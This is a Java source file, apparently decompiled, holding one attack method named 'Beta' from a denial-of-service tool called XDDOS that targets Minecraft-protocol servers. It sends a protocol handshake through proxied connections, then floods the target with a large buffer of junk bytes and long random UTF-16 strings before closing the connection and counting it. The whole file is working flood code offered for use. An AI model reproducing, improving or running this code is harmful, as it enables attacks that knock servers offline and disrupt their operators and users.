package XD.XDDOS.methods;

import java.io.IOException;

import XD.XDDOS.XDDOS;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.RandomUtils;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class Beta 
implements Method{
    
    private byte[] handshake = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake));
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream bbbb = new ByteBufOutputStream(b);

        try {
            for(int i = 0; i < 2000; ++i) {
                for(boolean var6 = false; i < 2300; ++i) {
                    bbbb.write(0);
                    bbbb.write(-1);
                    bbbb.write(2626);
                    bbbb.write(0);
                    bbbb.write(-6);
                    bbbb.write(13950);
                    bbbb.writeUTF(RandomUtils.randomUTF16String1(1000));
                }
            }
        } catch (IOException var7) {
            var7.printStackTrace();
        }

        channel.writeAndFlush(b);
        channel.writeAndFlush(bbbb);
        ++NettyBootstrap.integer;
        NettyBootstrap.totalConnections++;
        channel.close();
    }
    
}
